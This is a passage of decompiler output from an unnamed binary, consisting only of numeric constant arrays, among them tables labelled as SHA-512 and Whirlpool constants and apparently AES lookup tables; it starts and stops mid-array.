  1545864777,
  1655493570,
  2045023633,
  1832372455,
  -1454451315,
  -353085844,
  145652325,
  774207674,
  -961239524,
  527752680,
  -1970553525,
  1723154032,
  251003720,
  -1185467039,
  -1642217082,
  295237857,
  -1802577559,
  -377020773,
  -551004722,
  227123596,
  1749214911,
  254646593,
  381375664,
  2071428195,
  -982553614,
  728170800,
  1990973438,
  2110358218,
  -263759366,
  -1348283219,
  -1066228580,
  647232951,
  -856211658,
  -236608204,
  355588209,
  -1021065468,
  -1710909928,
  -494923257,
  1974609899,
  439124745,
  -1604686309,
  -1277805742,
  -2077236439,
  -318713517,
  1538391072,
  968805226,
  -816296886,
  -72683568,
  -2060235453,
  2130901317,
  -1465959344,
  -1891589295,
  -180839022,
  567981756,
  -755761392,
  -334295859,
  390371167,
  1031710660,
  1931042148,
  -598769312,
  -2003817950,
  347663942,
  -620011810,
  171586272,
  1545864777,
  1655493570,
  2045023633,
  1832372455,
  -1454451315,
  -353085844,
  145652325,
  774207674,
  -961239524,
  527752680,
  -1970553525,
  1723154032,
  251003720,
  -1185467039,
  -1642217082,
  295237857,
  -1802577559,
  -377020773,
  -551004722,
  227123596,
  1749214911,
  254646593,
  381375664,
  2071428195,
  -982553614,
  728170800,
  1990973438,
  2110358218,
  -263759366,
  -1348283219,
  -1066228580,
  647232951,
  -856211658,
  -236608204,
  355588209,
  -1021065468,
  -1710909928,
  -494923257,
  1974609899,
  439124745,
  -1604686309,
  -1277805742,
  -2077236439,
  -318713517,
  1538391072,
  968805226,
  -816296886,
  -72683568,
  -2060235453,
  2130901317,
  -1465959344,
  -1891589295,
  -180839022,
  567981756,
  -755761392,
  -334295859,
  390371167,
  1031710660,
  1931042148,
  -598769312,
  -2003817950,
  347663942,
  -620011810,
  171586272,
  1545864777,
  1655493570,
  2045023633,
  1832372455,
  -1454451315,
  -353085844,
  145652325,
  774207674,
  -961239524,
  527752680,
  -1970553525,
  1723154032,
  251003720,
  -1185467039,
  -1642217082,
  295237857,
  -1802577559,
  -377020773,
  -551004722,
  227123596,
  1749214911,
  254646593,
  381375664,
  2071428195,
  -982553614,
  728170800,
  1990973438,
  2110358218,
  -263759366,
  -1348283219,
  -1066228580,
  647232951,
  -856211658,
  -236608204,
  355588209,
  -1021065468,
  -1710909928,
  -494923257,
  1974609899,
  439124745,
  -1604686309,
  -1277805742,
  -2077236439,
  -318713517,
  1538391072,
  968805226,
  -816296886,
  -72683568,
  -2060235453,
  2130901317,
  -1465959344,
  -1891589295,
  -180839022,
  567981756,
  -755761392,
  -334295859,
  390371167,
  1031710660,
  1931042148,
  -598769312,
  -2003817950,
  347663942,
  -620011810,
  171586272,
  1545864777,
  1655493570,
  2045023633,
  1832372455,
  -1454451315,
  -353085844,
  145652325,
  774207674,
  -961239524,
  527752680,
  -1970553525,
  1723154032,
  251003720,
  -1185467039,
  -1642217082,
  295237857,
  -1802577559,
  -377020773,
  -551004722,
  227123596,
  1749214911,
  254646593,
  381375664,
  1,
  2,
  4,
  8,
  16,
  32,
  64,
  128,
  27,
  54,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
int dword_426540[7] = { 202182159, 134810123, 67438087, 66051, 1, 0, 0 }; // weak
int dword_426580[128] =
{
  29491200,
  38142852,
  113903368,
  88999052,
  265424400,
  206966164,
  148506904,
  190712476,
  501357600,
  510009252,
  451549992,
  426645676,
  334631472,
  276173236,
  351933752,
  394139324,
  964835392,
  973487044,
  1049247560,
  1024343244,
  932329040,
  873870804,
  815411544,
  857617116,
  631383136,
  640034788,
  581575528,
  556671212,
  733096560,
  674638324,
  750398840,
  792604412,
  1900179584,
  1925608196,
  1984591752,
  1976464396,
  2136112784,
  2094431508,
  2019195288,
  2078177820,
  1835166880,
  1860595492,
  1785359272,
  1777231916,
  1668440752,
  1626759476,
  1685743032,
  1744725564,
  1224886464,
  1250315076,
  1309298632,
  1301171276,
  1192380112,
  1150698836,
  1075462616,
  1134445148,
  1428313312,
  1453741924,
  1378505704,
  1370378348,
  1530026736,
  1488345460,
  1547329016,
  1606311548,
  -524099328,
  -481893756,
  -406133240,
  -464591476,
  -288166128,
  -313070444,
  -371529704,
  -362878052,
  -52232928,
  -10027356,
  -68486616,
  -126944852,
  -218959056,
  -243863372,
  -168102856,
  -159451204,
  -662513344,
  -620307772,
  -544547256,
  -603005492,
  -695019696,
  -719924012,
  -778383272,
  -769731620,
  -995965600,
  -953760028,
  -1012219288,
  -1070677524,
  -894252176,
  -919156492,
  -843395976,
  -834744324,
  -1874685568,
  -1815703036,
  -1756719480,
  -1798400756,
  -1638752368,
  -1646879724,
  -1722115944,
  -1696687332,
  -1939698272,
  -1880715740,
  -1955951960,
  -1997633236,
  -2106424400,
  -2114551756,
  -2055568200,
  -2030139588,
  -1476220480,
  -1417237948,
  -1358254392,
  -1399935668,
  -1508726832,
  -1516854188,
  -1592090408,
  -1566661796,
  -1272793632,
  -1213811100,
  -1289047320,
  -1330728596,
  -1171080208,
  -1179207564,
  -1120224008,
  -1094795396
}; // weak
int dword_426780[3] = { 0, 0, 0 }; // weak
int SHA512_Constants_465340[163] =
{
  -685199838,
  1116352408,
  602891725,
  1899447441,
  -330482897,
  -1245643825,
  -2121671748,
  -373957723,
  -213338824,
  961987163,
  -1241133031,
  1508970993,
  -1357295717,
  -1841331548,
  -630357736,
  -1424204075,
  -1560083902,
  -670586216,
  1164996542,
  310598401,
  1323610764,
  607225278,
  -704662302,
  1426881987,
  -226784913,
  1925078388,
  991336113,
  -2132889090,
  633803317,
  -1680079193,
  -815192428,
  -1046744716,
  -1628353838,
  -459576895,
  944711139,
  -272742522,
  -1953704523,
  264347078,
  2007800933,
  604807628,
  1495990901,
  770255983,
  1856431235,
  1249150122,
  -1119749164,
  1555081692,
  -2096016459,
  1996064986,
  -295247957,
  -1740746414,
  766784016,
  -1473132947,
  -1728372417,
  -1341970488,
  -1091629340,
  -1084653625,
  1034457026,
  -958395405,
  -1828018395,
  -710438585,
  -536640913,
  113926993,
  168717936,
  338241895,
  1188179964,
  666307205,
  1546045734,
  773529912,
  1522805485,
  1294757372,
  -1651133473,
  1396182291,
  -1951439906,
  1695183700,
  1014477480,
  1986661051,
  1206759142,
  -2117940946,
  344077627,
  -1838011259,
  1290863460,
  -1564481375,
  -1136513023,
  -1474664885,
  -789014639,
  -1035236496,
  106217008,
  -949202525,
  -688958952,
  -778901479,
  1432725776,
  -694614492,
  1467031594,
  -200395387,
  851169720,
  275423344,
  -1194143544,
  430227734,
  1363258195,
  506948616,
  -544281703,
  659060556,
  -509917016,
  883997877,
  -976659869,
  958139571,
  -482243893,
  1322822218,
  2003034995,
  1537002063,
  -692930397,
  1747873779,
  1575990012,
  1955562222,
  1125592928,
  2024104815,
  -1578062990,
  -2067236844,
  442776044,
  -1933114872,
  593698344,
  -1866530822,
  -561857047,
  -1538233109,
  -1295615723,
  -1090935817,
  -479046869,
  -965641998,
  -366583396,
  -903397682,
  566280711,
  -779700025,
  -840897762,
  -354779690,
  -294727304,
  -176337025,
  1914138554,
  116418474,
  -1563912026,
  174292421,
  -1090974290,
  289380356,
  320620315,
  460393269,
  587496836,
  685471733,
  1086792851,
  852142971,
  365543100,
  1017036298,
  -1676669620,
  1126000580,
  -885112138,
  1288033470,
  -60457430,
  1501505948,
  987167468,
  1607167915,
  1246189591,
  1816402316,
  67438087,
  66051,
  202182159
}; // weak
int dword_46C480[24] =
{
  1518500249,
  1518500249,
  1518500249,
  1518500249,
  1859775393,
  1859775393,
  1859775393,
  1859775393,
  -1894007588,
  -1894007588,
  -1894007588,
  -1894007588,
  -899497514,
  -899497514,
  -899497514,
  -899497514,
  66051,
  67438087,
  134810123,
  202182159,
  202182159,
  134810123,
  67438087,
  66051
}; // weak
int SHA512_Constants_46C840[68] =
{
  1116352408,
  1899447441,
  -1245643825,
  -373957723,
  961987163,
  1508970993,
  -1841331548,
  -1424204075,
  -670586216,
  310598401,
  607225278,
  1426881987,
  1925078388,
  -2132889090,
  -1680079193,
  -1046744716,
  -459576895,
  -272742522,
  264347078,
  604807628,
  770255983,
  1249150122,
  1555081692,
  1996064986,
  -1740746414,
  -1473132947,
  -1341970488,
  -1084653625,
  -958395405,
  -710438585,
  113926993,
  338241895,
  666307205,
  773529912,
  1294757372,
  1396182291,
  1695183700,
  1986661051,
  -2117940946,
  -1838011259,
  -1564481375,
  -1474664885,
  -1035236496,
  -949202525,
  -778901479,
  -694614492,
  -200395387,
  275423344,
  430227734,
  506948616,
  659060556,
  883997877,
  958139571,
  1322822218,
  1537002063,
  1747873779,
  1955562222,
  2024104815,
  -2067236844,
  -1933114872,
  -1866530822,
  -1538233109,
  -1090935817,
  -965641998,
  66051,
  67438087,
  134810123,
  202182159
}; // weak
int dword_484000[512] =
{
  -869839556,
  -1890628875,
  1745144040,
  -2141500919,
  837319325,
  426276360,
  531892383,
  -662093006,
  -1208626380,
  1044573877,
  2080768401,
  311941567,
  80288467,
  344150925,
  428797992,
  -2132438580,
  -1916676588,
  -1489279391,
  2011438624,
  -83532073,
  2056956252,
  676343986,
  -838958969,
  -1543523359,
  -1686225851,
  -1614692344,
  -1988252370,
  -966750087,
  1499731884,
  2052509517,
  1856668362,
  -1960890620,
  -1846813271,
  -1726515364,
  1766179406,
  -966734034,
  862301500,
  -790335691,
  753016631,
  -480929690,
  566665830,
  777610190,
  1519004626,
  -1381503283,
  1145015542,
  -1926229396,
  -1975063862,
  -1762027956,
  1179521048,
  -1801437500,
  -765289178,
  196915275,
  -760916267,
  355282881,
  395832792,
  -983092533,
  -1461814257,
  -1197453940,
  -719000274,
  2009745877,
  -2093266913,
  2129113684,
  -312694918,
  94347647,
  227595476,
  -783403090,
  -1492463217,
  1706515299,
  700106955,
  -1303169556,
  -1208733012,
  -815156886,
  -696314794,
  495504069,
  536727369,
  806597068,
  1847382082,
  1090096696,
  685172967,
  -214862566,
  -1254144464,
  1278560138,
  438754158,
  198746917,
  -1861070563,
  -2089414324,
  1042984217,
  -63169356,
  1485053972,
  1754579835,
  2084527200,
  1098233126,
  -202587637,
  1102797718,
  1749942322,
  -1764101653,
  -1330904857,
  -247056101,
  -1216538423,
  -1950596412,
  -1750516215,
  955827758,
  1378673827,
  -973659043,
  1578543893,
  -673698746,
  -34426035,
  876377572,
  -1836271211,
  -997506507,
  517237960,
  1842558311,
  1962902905,
  654786750,
  82455669,
  -2139970868,
  -1963040873,
  1844711254,
  1258578340,
  -656231330,
  1040037511,
  -458651136,
  -330342558,
  1797799966,
  642780961,
  -1893359465,
  -597036482,
  -608639690,
  1945861377,
  1442266749,
  870332737,
  1800135437,
  -596754821,
  896440957,
  -1844234064,
  -1075404416,
  2142739715,
  1011273301,
  -67451102,
  -1610171880,
  -1069582327,
  1793482617,
  -942559447,
  -1175607420,
  -1048477002,
  872476243,
  1524597160,
  780011475,
  731987991,
  -1709233420,
  -1468828313,
  -552114856,
  -982088463,
  -510441331,
  276014376,
  54107758,
  -102804887,
  -212108218,
  -647783845,
  1938748751,
  595407853,
  -1690538823,
  880791463,
  -18704529,
  -2032039158,
  -584150653,
  -1497386645,
  2033209234,
  104763752,
  621537559,
  -1853315577,
  -657953172,
  1163815132,
  1458525682,
  -1982846664,
  -1622058944,
  -972512161,
  1876046996,
  -898756775,
  1062633349,
  254119852,
  1084154695,
  816765165,
  1078440973,
  455320395,
  -536932481,
  -1299767953,
  -1154047852,
  -1356983469,
  -1794639726,
  1101587655,
  150007209,
  -313867780,
  -988590182,
  -174748947,
  1978595177,
  -1883615818,
  1357390693,
  685210270,
  1290225978,
  -1117469060,
  185866124,
  -1414208587,
  698980875,
  1773841028,
  -893440316,
  919801175,
  318791969,
  -1493638251,
  -1258130332,
  -569932097,
  -534558617,
  -2042980828,
  1973942962,
  -884857164,
  -1862840682,
  -790321746,
  266809669,
  -1799369760,
  1699689364,
  -993985788,
  -207269569,
  601213162,
  155770982,
  1344760506,
  718450412,
  -555419162,
  -2100531659,
  372702326,
  231186401,
  594201025,
  -46358082,
  -1859213362,
  542778166,
  -1849338401,
  1231182898,
  235637735,
  535703196,
  -67056898,
  178050901,
  1185983093,
  1177245072,
  -1415735125,
  1476596238,
  1500007153,
  1832372596,
  1943266927,
  -1092770831,
  -965424507,
  -2089856586,
  8429935,
  -1492486144,
  786606079,
  -1154396321,
  857839899,
  939748953,
  -224863984,
  1795730700,
  1588939008,
  1232101393,
  -1163101697,
  -1620493008,
  -338166865,
  -1760703006,
  1858639033,
  -2140914938,
  -1333686415,
  -1110974376,
  -1210815961,
  1153527001,
  -1137254088,
  19280650,
  180129829,
  -54811710,
  941231083,
  -174905704,
  -2092881619,
  1178647099,
  1409152755,
  23100089,
  1471450506,
  1916203992,
  -749129950,
  99755391,
  672725601,
  1365420,
  964463535,
  516661941,
  281744482,
  740497270,
  934028744,
  -2088664162,
  -768856322,
  727251007,
  -514883599,
  -1376270569,
  1472358231,
  -218419593,
  -2123060786,
  -2007304121,
  1967370614,
  1623770312,
  483514142,
  -964523570,
  -393769609,
  -267625520,
  -292730812,
  753190485,
  1567965484,
  497275482,
  -821525198,
  -29607421,
  -756058779,
  1712726694,
  -486199239,
  1836165975,
  -969943768,
  340141480,
  1738702589,
  -1030676354,
  -1394801877,
  716511914,
  -1659513340,
  2082755647,
  -646468747,
  -106789524,
  -1058280653,
  1486736679,
  271885230,
  1283294638,
  1183861781,
  -1477682208,
  25520306,
  -2058683923,
  -487934237,
  -2093825965,
  -1401485965,
  -257255755,
  -760992612,
  796180436,
  -1725806791,
  -882964912,
  784975257,
  1785255536,
  -884902972,
  -1742471797,
  548231441,
  -1431368310,
  854319824,
  1125019531,
  -1893211374,
  192324854,
  -626187525,
  -1874982372,
  166952384,
  -281864260,
  -2138770703,
  -679343318,
  148031381,
  1844835402,
  -460454391,
  160392052,
  249160394,
  455082782,
  1511914316,
  -2064963538,
  1872195458,
  -1480361267,
  208040825,
  -1879779948,
  606040876,
  -705816644,
  79210160,
  1641048685,
  -1756816669,
  -1131493996,
  168516524,
  -1996065595,
  1605878510,
  443261211,
  -1864700417,
  1779286417,
  46913030,
  2106922865,
  1803434950,
  218330056,
  1450413931,
  587804249,
  1325193806,
  356689148,
  -1754656722,
  -1531691960,
  -1021221876,
  665611499,
  -1852554417,
  -1375871880,
  1111729963,
  1675448752,
  364367308,
  -947055622,
  393493077,
  591279651,
  -510639391,
  -1210398793,
  -71046313,
  834623586,
  -607651030,
  847772733,
  1038433969,
  847658388,
  -770048415,
  1133195570,
  -442192933,
  -1372534732,
  -1722613108,
  945206325,
  -1325412553,
  1695686917,
  -2086882364,
  64164501,
  1536655482,
  -64539801,
  -1426591165,
  1442625120,
  1252208708,
  -147758941,
  -1917781503,
  61286786,
  -448823625,
  1370957414,
  1876790735,
  -1677969021,
  1102462373,
  -1295821687,
  -882629392,
  -1861550765,
  -30904468,
  773319105,
  -231844507,
  1773228616,
  -717038096,
  1966505183,
  -1455596581,
  1206625389,
  -799265969,
  1957162544,
  -1131781014,
  1451419035,
  -180362122,
  504977669,
  2012301184,
  -2143079764,
  -1238885622,
  796715252,
  1783343339,
  2012788057,
  1820775528,
  12901511,
  -153366961,
  41206580,
  873323272,
  1246358157,
  -853844176,
  -1808516442,
  1651126879,
  -1991160938,
  -544159440,
  1007580023,
  -295912100,
  602568665,
  1806019138,
  1891929337,
  1695276392,
  2078590883,
  629508362,
  966362237,
  2143205606,
  209981233,
  1286304408,
  -2086358972,
  1939061648,
  1673135879,
  -512728741,
  -693457276,
  -783000925,
  2066532330,
  2139769703,
  579676262,
  1768194796,
  760475747,
  882678800,
  1083622991,
  -150024485,
  1072597562,
  204169010,
  -77349814,
  1462171160,
  -1223486519,
  1312738528,
  1424161395,
  -486643775,
  -105906708,
  -375416426,
  966054114,
  902482227,
  1180216615,
  1595368600,
  -934555927,
  -1999499861,
  -1168327700,
  -733204287,
  -1794699879
}; // weak
int dword_4A9000[2] = { 3, 0 }; // weak
int dword_4A9040[8] = { 1, 0, 0, 0, 0, 0, 0, 0 }; // weak
_UNKNOWN loc_4AC015; // weak
int dword_4ACF00[13] =
{
  16777986,
  84150022,
  151522058,
  218894094,
  33619971,
  100992007,
  168364043,
  235736079,
  1634760805,
  857760878,
  2036477234,
  1797285236,
  0
}; // weak
int dword_4AED00[148] =
{
  1886416896,
  1886388336,
  -2105376256,
  741081132,
  741092352,
  -1280114509,
  -320017408,
  -1061158720,
  -1280068864,
  -454819612,
  656877312,
  1465319511,
  -1061109760,
  -353763094,
  -437918464,
  -1364328274,
  -454761472,
  589496355,
  -2054847232,
  1802174571,
  1465341696,
  1162149957,
  892679424,
  -1515913051,
  -353703424,
  -303234835,
  202116096,
  1330577487,
  -1364283904,
  488439837,
  1094795520,
  -1835925358,
  589505280,
  -2038038394,
  -269488384,
  -1347485521,
  1802201856,
  2088501372,
  -1819045120,
  522125343,
  1162167552,
  1044250686,
  421075200,
  -589561636,
  -1515870976,
  1583218782,
  555819264,
  185270283,
  -303174400,
  -1499070298,
  235802112,
  960036921,
  1330597632,
  -707460907,
  1313754624,
  1566376029,
  488447232,
  -640089895,
  1701143808,
  1515847770,
  -1835888128,
  1364262993,
  -1111638784,
  1819017324,
  -2038004224,
  -1953824629,
  -1195853824,
  -1701183334,
  -1347440896,
  -67436293,
  -1886417152,
  -1330642768,
  2088532992,
  1953759348,
  -336860416,
  724238379,
  522133248,
  -252706576,
  -825307648,
  -2071723900,
  1044266496,
  -539033377,
  808464384,
  -875888437,
  -589505536,
  875823156,
  1600085760,
  1987444854,
  1583242752,
  1835860077,
  -976894720,
  -1448542039,
  185273088,
  -774831919,
  437918208,
  67371012,
  -1499027968,
  336855060,
  -505290496,
  976879674,
  960051456,
  -555876130,
  -892679680,
  286326801,
  -707406592,
  842137650,
  1195853568,
  -1667497828,
  1566399744,
  1397948499,
  1027423488,
  -219021070,
  -640034560,
  -16908034,
  16843008,
  -808517425,
  1515870720,
  -1010630461,
  -690563584,
  2054815866,
  1364283648,
  606339108,
  1448498688,
  -387448600,
  1819044864,
  1616904288,
  1296911616,
  1768489065,
  -1953789184,
  -1431699286,
  218959104,
  -1600126816,
  -1701144064,
  -1583284063,
  1717986816,
  1650589794,
  -67372288,
  1414791252,
  -858993664,
  505282590,
  -1330597888,
  -522190624,
  757935360,
  1684275300,
  1953788928,
  269484048,
  303174144,
  0
}; // weak
int dword_4AF194[512] =
{
  -336920341,
  1212696576,
  -825360178,
  -1549556992,
  808452144,
  -134744320,
  1600061535,
  1970631936,
  -976944955,
  -606348544,
  437911578,
  -1970632192,
  -505347871,
  50529024,
  -892731190,
  -421075456,
  1195835463,
  -623191552,
  1027407933,
  151587072,
  16842753,
  1061109504,
  -690618154,
  -572662528,
  1448476758,
  -1802202112,
  1296891981,
  -2021161216,
  218955789,
  1549556736,
  1717960806,
  -2088533248,
  -859045684,
  33686016,
  757923885,
  -842150656,
  303169554,
  1246382592,
  538968096,
  -1869574144,
  -1313800015,
  858993408,
  -1718026087,
  1936945920,
  1280049228,
  1734829824,
  -1027473214,
  -151587328,
  2122186878,
  -202116352,
  84213765,
  -1650615040,
  -1212743497,
  2139062016,
  825294897,
  -1077952768,
  387383319,
  -488447488,
  -673775401,
  1381126656,
  1482162264,
  -1684301056,
  1633747041,
  -656877568,
  454754331,
  640034304,
  471597084,
  -926365696,
  252641295,
  926365440,
  370540566,
  -960051712,
  404226072,
  993737472,
  572653602,
  -2122219264,
  1145307204,
  -1768516096,
  -1296957262,
  1869573888,
  -1246429003,
  1263225600,
  -1852768111,
  320017152,
  134742024,
  -1094795776,
  -1465384792,
  1667457792,
  -50593540,
  774778368,
  1347420240,
  -370546432,
  -791674672,
  2038003968,
  2105344125,
  -1482184960,
  -1987510135,
  -1936946176,
  -1751711593,
  -1616929024,
  1532690523,
  1852730880,
  -1785397099,
  -1128481792,
  -65281,
  -1903260160,
  -757989166,
  690563328,
  -993787708,
  -168430336,
  1212678216,
  -101058304,
  -134807305,
  -1229539840,
  -606404389,
  791621376,
  50528259,
  -33686272,
  -623247142,
  -1263225856,
  1061093439,
  1499027712,
  -1802239852,
  2021160960,
  1549533276,
  -1734830080,
  33685506,
  101058048,
  1246363722,
  1785358848,
  858980403,
  -404232448,
  1734803559,
  1179010560,
  -202178317,
  1903259904,
  2139029631,
  -1162167808,
  -488505118,
  -724249600,
  -1684340581,
  623191296,
  640024614,
  -1414812928,
  926351415,
  1111638528,
  993722427,
  -2004318208,
  -1768554346,
  -1566400000,
  1263206475,
  -1920103168,
  -1094844226,
  -84215296,
  774766638,
  1920102912,
  2037973113,
  117901056,
  -1936981876,
  -1179010816,
  1852702830,
  1431655680,
  -1903296370,
  -117901312,
  -168492811,
  -286331392,
  -1229586250,
  -1397969920,
  -33750787,
  168430080,
  1499005017,
  909522432,
  -1734868840,
  1229539584,
  1785331818,
  707406336,
  1178992710,
  1751672832,
  -1162215238,
  1010580480,
  623181861,
  943208448,
  1111621698,
  -235802368,
  -1566441310,
  -1532713984,
  -84279046,
  1077952512,
  117899271,
  673720320,
  1431634005,
  -741092608,
  -286392082,
  2071689984,
  168427530,
  -1145324800,
  1229520969,
  -909522688,
  1751646312,
  1128481536,
  943194168,
  -1044266752,
  -1532755804,
  353703168,
  673710120,
  -471604480,
  2071658619,
  -1381126912,
  -909573943,
  -185273344,
  -1044315967,
  2004317952,
  -471662365,
  -943208704,
  -185335564,
  -2139062272,
  -943259449,
  -1633772032,
  -1633812322,
  14737632,
  939538488,
  328965,
  1090535745,
  5789784,
  369104406,
  14277081,
  1979741814,
  6776679,
  -654255655,
  5131854,
  -1828678765,
  8487297,
  1610637408,
  13355979,
  -234818830,
  13224393,
  1912631922,
  723723,
  -1040137534,
  11447982,
  -1426019413,
  6974058,
  -1711236454,
  14013909,
  1962964341,
  1579032,
  100664838,
  6118749,
  1459640151,
  8553090,
  -1610571616,
  4605510,
  -1862233711,
  14671839,
  -150931465,
  14079702,
  -1258244683,
  2565927,
  -922695223,
  9079434,
  -1577016670,
  3289650,
  -1946121076,
  4934475,
  -771697966,
  4342338,
  -1879011184,
  14408667,
  -167708938,
  1842204,
  117442311,
  10395294,
  -1493129305,
  10263708,
  654321447,
  3815994,
  -1912566130,
  13290186,
  -1308577102,
  2434341,
  1224755529,
  8092539,
  -570368290,
  855309,
  1124090691,
  7434609,
  1543527516,
  6250335,
  -687810601,
  2039583,
  -956250169,
  16316664,
  1040203326,
  14145495,
  -184486411,
  4079166,
  -1895788657,
  10329501,
  1728079719,
  8158332,
  520101663,
  6316128,
  402659352,
  12171705,
  1845522030,
  12500670,
  -1358909521,
  12369084,
  788541231,
  9145227,
  -503258398,
  1447446,
  -2063563387,
  3421236,
  218107149,
  5066061,
  1392530259,
  12829635,
  -268373776,
  7500402,
  -1677681508,
  9803157,
  1694524773,
  11250603,
  -369038614,
  9342606,
  -1560239197,
  12237498,
  -1375686994,
  8026746,
  -1644126562,
  11776947,
  -335483668,
  131586,
  -2147450752,
  11842740,
  754986285,
  11382189,
  1795189611,
  10658466,
  -1476351832,
  11316396,
  721431339,
  14211288,
  905983542,
  10132122,
  -1509906778,
  1513239,
  -989805115,
  1710618,
  -2046785914,
  3487029,
  1291865421,
  13421772,
  855651123,
  16250871,
  -50266627,
  10066329,
  1711302246,
  6381921,
  1476417624,
  5921370,
  -1778346346,
  15263976,
  973093434,
  2368548,
  150997257,
  5658198,
  -1795123819,
  4210752,
  268439568,
  14803425,
  2013296760,
  6513507,
  -671033128,
  592137,
  1107313218,
  3355443,
  -872362804,
  12566463,
  -285151249,
  10000536,
  637543974,
  9934743,
  -452925979,
  8750469,
  1627414881,
  6842472,
  436214298,
  16579836,
  1056980799,
  15527148,
  989870907,
  657930,
  -2113895806,
  14342874,
  -1241467210,
  7303023,
  -620700709,
  5460819,
  -738143020,
  6447714,
  -1744791400,
  10724259,
  -402593560,
  3026478,
  -1962898549,
  526344,
  33554946,
  11513775,
  -352261141,
  2631720,
  167774730,
  11579568,
  738208812,
  7631988,
  486546717,
  12763842,
  -1342132048,
  12434877,
  1862299503,
  3552822,
  -1929343603,
  2236962,
  -2013230968,
  3684408,
  234884622,
  6579300,
  419436825,
  1973790,
  -2030008441,
  3750201,
  1308642894,
  2894892,
  184552203,
  10921638,
  -1459574359,
  3158064,
  201329676,
  15066597,
  2030074233,
  4473924,
  285217041,
  16645629,
  2130739071,
  8947848,
  570434082,
  10461087,
  -419371033,
  6645093,
  1493195097,
  8882055,
  -520035871,
  7039851,
  -637478182,
  16053492,
  1023425853,
  2302755,
  -939472696,
  4737096,
  301994514,
  1052688,
  67109892,
  13750737,
  1946186868,
  5329233,
  1409307732,
  12632256,
  805318704,
  16382457,
  2113961598,
  13816530,
  -1275022156,
  10526880,
  671098920,
  5592405,
  1426085205,
  10592673,
  1744857192,
  4276545,
  1342197840,
  16448250,
  -1107247426,
  4408131,
  -805252912,
  1250067,
  -1006582588,
  12895428,
  822096177,
  3092271,
  -889140277,
  11053224,
  704653866,
  11974326,
  -1392464467,
  3947580,
  251662095,
  2829099,
  -905917750,
  12698049,
  1879076976,
  16777215,
  -16711681,
  13158600,
  838873650,
  10855845,
  1761634665,
  2105376,
  134219784,
  9013641,
  1644192354,
  0
}; // weak
int dword_4D38C0[2] = { 16777216, 0 }; // weak
int WHIRLPOOL_Constants_4D7040[512] =
{
  408950808,
  -667912000,
  408950808,
  -667912000,
  596386595,
  642166533,
  596386595,
  642166533,
  -968898874,
  -1198392962,
  -968898874,
  -1198392962,
  -393746200,
  -70422765,
  -393746200,
  -70422765,
  -2027518073,
  -887905972,
  -2027518073,
  -887905972,
  -1193625416,
  292381353,
  -1193625416,
  292381353,
  17039617,
  151127304,
  17039617,
  151127304,
  1327583055,
  228486722,
  1327583055,
  228486722,
  920139318,
  -1687359827,
  920139318,
  -1687359827,
  -1499289946,
  -11467687,
  -1499289946,
  -11467687,
  -764423470,
  213499358,
  -764423470,
  213499358,
  -168561163,
  251070203,
  -168561163,
  251070203,
  2046392697,
  -1762492177,
  2046392697,
  -1762492177,
  1872850799,
  819908191,
  1872850799,
  819908191,
  -1853976175,
  1832906748,
  -1853976175,
  1832906748,
  1381323346,
  -123467862,
  1381323346,
  -123467862,
  1620926560,
  1203830055,
  1620926560,
  1203830055,
  -1127564100,
  895841929,
  -1127564100,
  895841929,
  -1688822885,
  925617580,
  -1688822885,
  925617580,
  -1912435058,
  -1979610108,
  -1912435058,
  -1979610108,
  -1548311645,
  -765782671,
  -1548311645,
  -765782671,
  204475404,
  1813527648,
  204475404,
  1813527648,
  2079423355,
  -2064217345,
  2079423355,
  -2064217345,
  903099701,
  -2140479051,
  903099701,
  -2140479051,
  494148893,
  -180721176,
  494148893,
  -180721176,
  -525868832,
  -1277343917,
  -525868832,
  -1277343917,
  -679749673,
  565423350,
  -679749673,
  565423350,
  -1037057342,
  -1667633826,
  -1037057342,
  -1667633826,
  783822382,
  1130141293,
  783822382,
  1130141293,
  1261521739,
  697727586,
  1261521739,
  697727586,
  -18874626,
  1575035299,
  -18874626,
  1575035299,
  1463899991,
  -710011262,
  1463899991,
  -710011262,
  357831957,
  -1121304152,
  357831957,
  -1121304152,
  2009167735,
  -387008865,
  2009167735,
  -387008865,
  937178935,
  -1838224475,
  937178935,
  -1838224475,
  -441195035,
  -1630054789,
  -441195035,
  -1630054789,
  -1622761569,
  321116556,
  -1622761569,
  321116556,
  -253234960,
  603789267,
  -253234960,
  603789267,
  1245006410,
  546602858,
  1245006410,
  546602858,
  -632300838,
  1151964574,
  -632300838,
  1151964574,
  1484609624,
  -1565514246,
  1484609624,
  -1565514246,
  -922498615,
  -812660218,
  -922498615,
  -812660218,
  698624297,
  2085784917,
  698624297,
  2085784917,
  170396170,
  1511268944,
  170396170,
  1511268944,
  -1308708431,
  1350520801,
  -1308708431,
  1350520801,
  -1598381920,
  -916645271,
  -1598381920,
  -916645271,
  1806789483,
  349624959,
  1806789483,
  349624959,
  -2060548731,
  -652760228,
  -2060548731,
  -652760228,
  -1110524483,
  1013412737,
  -1110524483,
  1013412737,
  1567186269,
  -1883622190,
  1567186269,
  -1883622190,
  272633872,
  -1876930432,
  272633872,
  -1876930432,
  -185076492,
  133497843,
  -185076492,
  133497843,
  -888419381,
  -578043882,
  -888419381,
  -578043882,
  1056456254,
  -746797331,
  1056456254,
  -746797331,
  85198085,
  755634472,
  85198085,
  755634472,
  1736533863,
  2026825247,
  1736533863,
  2026825247,
  -457710364,
  -1747627149,
  -457710364,
  -1747627149,
  664545063,
  38714149,
  664545063,
  38714149,
  1092174145,
  1937922098,
  1092174145,
  1937922098,
  -1961456757,
  -1492411092,
  -1961456757,
  -1492411092,
  -1482250329,
  -162332335,
  -1482250329,
  -162332335,
  2112454013,
  -1292200753,
  2112454013,
  -1292200753,
  -1787914859,
  1228405724,
  -1787914859,
  1228405724,
  -666380072,
  1454219150,
  -666380072,
  1454219150,
  -70517765,
  1894461579,
  -70517765,
  1894461579,
  -291508498,
  -842960605,
  -291508498,
  -842960605,
  2095938684,
  -1141337657,
  2095938684,
  -1141337657,
  1720018534,
  1909252887,
  1720018534,
  1909252887,
  -581706275,
  2074578598,
  -581706275,
  2074578598,
  391911191,
  -1355920456,
  391911191,
  -1355920456,
  1191266119,
  1166951938,
  1191266119,
  1166951938,
  -1639801186,
  438426756,
  -1639801186,
  438426756,
  -904934710,
  -729168610,
  -904934710,
  -729168610,
  766782765,
  1482332533,
  766782765,
  1482332533,
  -1077493825,
  778271121,
  -1077493825,
  778271121,
  119277319,
  1057889080,
  119277319,
  1057889080,
  -1383158355,
  -1404624127,
  -1383158355,
  -1404624127,
  1517640282,
  -1330368534,
  1517640282,
  -1330368534,
  -2093579389,
  -283396756,
  -2093579389,
  -283396756,
  869020467,
  -1234763899,
  869020467,
